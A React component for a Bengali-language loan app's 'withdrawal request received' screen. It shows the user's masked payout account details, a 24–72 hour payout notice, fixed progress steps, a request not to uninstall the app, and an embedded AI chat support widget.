import React from 'react';
import AIChatSupport from './AIChatSupport';

const LABELS: Record<string,string> = { bkash:'বিকাশ', nagad:'নগদ', rocket:'রকেট', bank:'ব্যাংক' };
const mask = (n:string) => n.length<=4?n:n.slice(0,4)+'****'+n.slice(-4);

interface Props { sessionId: string; withdrawalDetails: any; submittedAt: number; }

const WithdrawalWaiting: React.FC<Props> = ({ sessionId, withdrawalDetails: wd, submittedAt }) => {
  const al = LABELS[wd?.accountType] || wd?.accountType || '-';
  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100 flex items-center justify-center px-4 py-12">
      <div className="max-w-lg w-full bg-white rounded-3xl shadow-2xl p-8 md:p-12 text-center">
        <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-6"><svg className="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></div>
        <h2 className="text-2xl font-black text-gray-800 mb-2">উত্তোলনের অনুরোধ গৃহীত হয়েছে</h2>
        <p className="text-gray-500 text-sm mb-6">আপনার টাকা নির্ধারিত অ্যাকাউন্টে পাঠানো হবে</p>
        <div className="bg-gray-50 border border-gray-200 rounded-2xl p-5 mb-6 text-left">
          <h3 className="font-bold text-gray-800 text-sm mb-3">আপনার প্রদত্ত তথ্য</h3>
          <div className="space-y-2 text-sm">
            <div className="flex justify-between"><span className="text-gray-500">মাধ্যম:</span><span className="font-bold text-gray-800">{al}</span></div>
            <div className="flex justify-between"><span className="text-gray-500">{wd?.accountType==='bank'?'অ্যাকাউন্ট নং':'মোবাইল নং'}:</span><span className="font-mono font-bold text-gray-800">{mask(wd?.accountNumber||'')}</span></div>
            <div className="flex justify-between"><span className="text-gray-500">নাম:</span><span className="font-bold text-gray-800">{wd?.accountHolder||'-'}</span></div>
            {wd?.bankName&&<div className="flex justify-between"><span className="text-gray-500">ব্যাংক:</span><span className="font-bold text-gray-800">{wd.bankName}</span></div>}
            <div className="flex justify-between"><span className="text-gray-500">সময়:</span><span className="text-xs text-gray-400">{new Date(submittedAt).toLocaleString()}</span></div>
          </div>
        </div>
        <div className="bg-blue-50 border border-blue-200 rounded-2xl p-5 mb-6"><p className="text-blue-800 text-sm leading-relaxed">আপনার টাকা <strong>২৪ থেকে ৭২ ঘণ্টার</strong> মধ্যে আপনার প্রদত্ত অ্যাকাউন্টে জমা হবে। অনুগ্রহপূর্বক অপেক্ষা করুন। টাকা পাঠানোর পর আপনাকে নোটিফিকেশন এর মাধ্যমে জানিয়ে দেওয়া হবে।</p></div>
        <div className="space-y-3 text-left text-sm text-gray-500 mb-6">
          {['যাচাই সম্পন্ন: আপনার আবেদন যাচাই করা হয়েছে','অনুমোদিত: আপনার লোন অনুমোদিত হয়েছে','উত্তোলনের তথ্য: অ্যাকাউন্ট তথ্য জমা হয়েছে','অপেক্ষা: ২৪-৭২ ঘণ্টার মধ্যে টাকা জমা হবে'].map((t,i)=><div key={i} className="flex items-start gap-3"><span className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold flex-shrink-0 mt-0.5 ${i<3?'bg-green-100 text-green-600':'bg-blue-100 text-blue-600'}`}>{i<3?'✓':i+1}</span><p><strong>{t.split(':')[0]}:</strong>{t.includes(':')?t.split(':').slice(1).join(':'):''}</p></div>)}
        </div>
        <div className="p-4 bg-amber-50 border border-amber-200 rounded-xl"><p className="text-amber-800 text-xs font-medium">⚠️ দয়া করে অ্যাপটি আনইনস্টল করবেন না। টাকা পাঠানোর কনফার্মেশন নোটিফিকেশন পেতে অ্যাপটি চালু রাখুন।</p></div>
        <p className="text-xs text-gray-400 mt-4">সেশন ID: {sessionId}</p>
      </div>
      <AIChatSupport step="submitted" />
    </div>
  );
};
export default WithdrawalWaiting;
